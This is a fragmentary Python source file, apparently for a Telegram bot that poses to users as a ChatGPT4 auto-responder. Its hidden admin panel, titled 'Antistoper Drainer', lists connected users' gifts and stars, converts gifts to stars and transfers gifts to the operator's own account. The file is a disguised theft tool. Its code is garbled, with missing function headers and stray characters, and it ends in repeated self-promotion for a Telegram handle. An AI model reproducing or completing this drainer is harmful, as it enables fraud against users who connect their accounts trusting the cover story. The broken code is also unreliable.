from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars





    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

\

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"Неизвестный бизнес connection_id: {conn_id}")
            return

        owner_id = connection["user_id"]

        if sender_id != owner_id:
            await bot.send_message(business_connection_id=message.business_connection_id,
                                chat_id=message.from_user.id, text=f"<b>Привет! Я сейчас оффлайн, поэтому за меня ответит ChatGPT4:</b>\n\n{gpt_answer.generate(message.text)}", parse_mode="HTML")
    except Exception as e:
       logging.exception("Ошибка при ответе.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(f"Добро пожаловать в автоответчик на ChatGPT4!\nПросто подключите меня как бизнес бота, и я начну отвечать за вас!")
    else:
        await message.answer(f"Antistoper Drainer\n\n🔗 Количество подключений: {count}\n\n/gifts - просмотреть гифты\n/stars - просмотреть звезды\n/transfer <owned_id> <business_connect> - передать гифт вручную\n/convert - конвертировать подарки в звезды")


            return await message.answer("❌ Нет активного бизнес-подключения.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("✅ Подарок успешно передан тебе!")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await message.answer(f"Ошибка: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"❌ Ошибка передачи: {e.message}")
    except Exception as e:
        await message.answer(f"⚠️ Неизвестная ошибка: {e}")

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return
\


my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks my telegram @Clof1ks             my telegram @Clof1ks

               
my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks
my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks                      my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks
                                                    my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks

s
       my telegram @Clof1ks                                  my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks


